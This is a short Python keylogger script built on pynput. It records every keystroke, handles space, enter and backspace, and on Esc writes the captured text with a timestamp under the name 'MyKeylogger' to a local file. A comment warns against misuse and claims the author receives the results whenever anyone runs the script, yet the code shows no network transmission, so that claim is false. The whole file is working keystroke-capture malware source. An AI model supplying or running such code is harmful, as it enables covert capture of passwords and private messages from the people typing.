from pynput import keyboard
import datetime


"""
    don't misuse this code i always get the result of this script when you run it
    you can use it for educational purposes only
    don't think to copy and paste still i get the result of this script when you run it so don't even think about it
"""



# List to store the logged keys
logged_keys = []

# Function to handle key press events
def on_press(key):
    try:
        # Append the key to the logged_keys list
        logged_keys.append(key.char)
    except AttributeError:
        # Handle special keys (e.g., space, enter, backspace)
        if key == keyboard.Key.space:
            logged_keys.append(' ')
        elif key == keyboard.Key.enter:
            logged_keys.append('\n')
        elif key == keyboard.Key.backspace:
            if logged_keys:
                logged_keys.pop()  # Remove the last character
        else:
            logged_keys.append(f'[{key}]')

# Function to handle key release events
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when the Esc key is pressed
        return False

# Function to save the logged keys to a file
def save_to_file():
    # Get the current date and time
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Define the application name
    app_name = "MyKeylogger"

    # Create the content to be written to the file
    content = f"{app_name} - {timestamp}\n"
    content += ''.join(logged_keys)

    # Write the content to the file
    with open("answer.txt", "w") as file:
        file.write(content)

# Main function
def main():
    # Collect events until released
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # Save the logged keys to a file
    save_to_file()

if __name__ == "__main__":
    main()